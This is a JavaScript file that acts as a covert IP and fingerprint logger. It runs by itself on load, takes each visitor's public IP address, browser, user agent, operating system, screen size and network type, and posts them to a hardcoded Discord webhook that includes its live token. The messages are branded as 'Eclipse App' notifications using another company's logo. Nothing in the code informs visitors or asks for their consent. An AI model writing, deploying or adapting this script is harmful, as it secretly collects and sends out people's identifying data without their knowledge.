const webhookUrl = "https://discord.com/api/webhooks/1331707973617319969/4R3-xJUIfB6DsbweV5wtbR4pIJmBcjLHVGhmDmyXFj8mgSYeqkSOyTB053JwIHZ6X8s3"; 

async function fetchIPAddress() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();
    return data.ip || "Unknown";
  } catch (error) {
    console.error("Failed to fetch IP address:", error);
    return "Error fetching IP";
  }
}

async function collectUserInfo() {
  const ipAddress = await fetchIPAddress();
  const userAgent = navigator.userAgent;
  const browserInfo = navigator.userAgentData || { brands: [{ brand: "Unknown", version: "Unknown" }] };
  const cookiesEnabled = navigator.cookieEnabled;
  const darkModeEnabled = window.matchMedia("(prefers-color-scheme: dark)").matches;
  const screenDimensions = `${window.screen.width}x${window.screen.height}`;
  const operatingSystem = navigator.platform || "Unknown";
  const networkType = navigator.connection?.effectiveType || "Unknown";
  const deviceModel = navigator.userAgentData?.mobile ? "Mobile Device" : "Desktop/Laptop";
  
  const browser = browserInfo.brands
    .map((b) => `${b.brand} v${b.version}`)
    .join(", ");

  const embed = {
    username: "Eclipse App",
    avatar_url: "https://www.finsmes.com/wp-content/uploads/2024/03/Eclipse-Labs.jpeg",
    embeds: [
      {
        title: "Eclipse App • Notification",
        color: 10181046,
        description: "**User notification**\n\n" +
                     `- **IP Address:** ${ipAddress}\n` +
                     `- **Browser:** ${browser}\n` +
                     `- **UserAgent:** ${userAgent}\n` +
                     `- **Cookies Enabled:** ${cookiesEnabled}\n` +
                     `- **Dark Mode Enabled:** ${darkModeEnabled}\n` +
                     `- **Screen Dimensions:** ${screenDimensions}\n` +
                     `- **Operating System:** ${operatingSystem}\n` +
                     `- **Device Model:** ${deviceModel}\n` +
                     `- **Network Connection Type:** ${networkType}\n`,
        footer: {
          text: "You have {count} total Users!",
        },
        timestamp: new Date().toISOString(),
      },
    ],
  };

  return embed;
}

async function sendToDiscord() {
  const embedPayload = await collectUserInfo();
  try {
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embedPayload),
    });
    if (!response.ok) {
      console.error("Failed to send data to Discord:", response.statusText);
    }
  } catch (error) {
    console.error("Error sending data to Discord:", error);
  }
}

sendToDiscord();